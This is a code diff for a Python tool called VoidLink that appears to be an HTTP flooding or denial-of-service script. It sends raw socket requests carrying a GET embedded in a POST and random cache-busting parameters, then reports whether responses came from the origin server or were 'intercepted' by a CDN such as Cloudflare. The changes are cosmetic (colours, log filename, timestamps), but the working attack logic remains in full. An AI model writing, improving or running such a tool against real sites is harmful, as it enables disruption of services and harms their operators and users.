@@ -12,11 +12,16 @@ from colorama import init, Fore, Style
 
 init(autoreset=True)
 
+# Custom orange (ANSI 256)
+ORANGE = '\033[38;5;214m'
+BRIGHT_WHITE = Style.BRIGHT + Fore.WHITE
+
 class VoidLink:
     def __init__(self, target):
         self.target = target
         self.http_versions = ["HTTP/0.9", "HTTP/1.0", "HTTP/1.1"]
         self.last_log = 0
+        self.start_time = datetime.now()
         
         # User agents
         self.agents = [
@@ -41,7 +46,7 @@ class VoidLink:
         ]
         
         # Log file
-        self.log_file = open("voidlink.log", "a")
+        self.log_file = open("voidlink.txt", "a")
         
     def rand_str(self, n=8):
         return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
@@ -78,7 +83,7 @@ class VoidLink:
         start = time.time()
         
         try:
-            # Build request - EXACTLY what you wanted
+            # Build request
             http_ver = random.choice(self.http_versions)
             rand_param = self.rand_str(8)
             
@@ -92,7 +97,6 @@ class VoidLink:
             request += "Connection: keep-alive\r\n"
             request += "\r\n"
             
-            # Payload data (the GET part inside POST)
             payload = f"GET /?{rand_param} {http_ver}\r\n"
             payload += f"Host: {self.target}\r\n"
             payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
@@ -101,13 +105,11 @@ class VoidLink:
             payload += "Cache-Control: no-cache\r\n"
             payload += "Connection: keep-alive\r\n\r\n"
             
-            # Send request
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10)
             sock.connect((self.target, 80))
             sock.send(request.encode() + payload.encode())
             
-            # Get response
             resp = b''
             while True:
                 try:
@@ -121,10 +123,8 @@ class VoidLink:
                     break
             sock.close()
             
-            # Parse response
             resp_time = (time.time() - start) * 1000
             
-            # Get status code
             try:
                 headers = resp.split(b'\r\n\r\n')[0].decode('utf-8', errors='ignore')
                 status = int(headers.split()[1])
@@ -133,14 +133,18 @@ class VoidLink:
                 status = 0
                 all_headers = ''
             
-            # Detect origin or protection
             cdn = self.detect_cdn(all_headers)
             if cdn:
-                hit = f"cdn-{cdn}"
+                if cdn == 'cloudflare':
+                    hit_color = ORANGE
+                    hit_text = f"cdn-cloudflare"
+                else:
+                    hit_color = Fore.RED
+                    hit_text = f"cdn-{cdn}"
             else:
-                hit = f"org-{self.target}"
+                hit_color = BRIGHT_WHITE
+                hit_text = f"org-{self.target}"
             
-            # Success or failed
             if status < 400:
                 result = f"{Fore.GREEN}pxn-s{Style.RESET_ALL}"
                 log_result = "pxn-s"
@@ -148,17 +152,15 @@ class VoidLink:
                 result = f"{Fore.RED}intercepted{Style.RESET_ALL}"
                 log_result = "intercepted"
             
-            # VOIDLINK format
             current_time = time.time()
             if current_time - self.last_log >= 3:
-                print(f"VOIDLINK ---> ({hit}) ↓")
+                print(f"VOIDLINK ---> ({hit_color}{hit_text}{Style.RESET_ALL}) ↓")
                 print(f"({resp_time:.2f}ms) ---> {status} ←")
                 print(f"({self.format_size(len(resp))}) ---> {result}")
-                print()  # Extra space under log
+                print()
                 self.last_log = current_time
                 
-                # Write to log file
-                log_entry = f"{self.target} | {hit} | {status} | {resp_time:.2f}ms | {self.format_size(len(resp))} | {log_result}"
+                log_entry = f"{self.target} | {hit_text} | {status} | {resp_time:.2f}ms | {self.format_size(len(resp))} | {log_result}"
                 self.write_log(log_entry)
             
             return True
@@ -168,21 +170,20 @@ class VoidLink:
             
             current_time = time.time()
             if current_time - self.last_log >= 3:
-                print(f"VOIDLINK ---> (org-{self.target}) ↓")
+                print(f"VOIDLINK ---> ({BRIGHT_WHITE}org-{self.target}{Style.RESET_ALL}) ↓")
                 print(f"({resp_time:.2f}ms) ---> 000 ←")
                 print(f"(0B) ---> {Fore.RED}intercepted{Style.RESET_ALL}")
-                print()  # Extra space under log
+                print()
                 self.last_log = current_time
                 
-                # Write to log file
                 log_entry = f"{self.target} | org-{self.target} | 000 | {resp_time:.2f}ms | 0B | intercepted"
                 self.write_log(log_entry)
             
             return False
     
     def run(self):
-        print(f"\n{Fore.CYAN}VOIDLINK STARTED - Target: {self.target}{Style.RESET_ALL}")
-        print(f"Logging every 3 seconds to voidlink.log")
+        startup_time = self.start_time.strftime("%Y-%m-%d %H:%M:%S")
+        print(f"\n{Fore.CYAN}VOIDLINK ({startup_time}) - Target: {self.target} \\ logs to voidlink.txt{Style.RESET_ALL}")
         print("=" * 60)
         
         try:
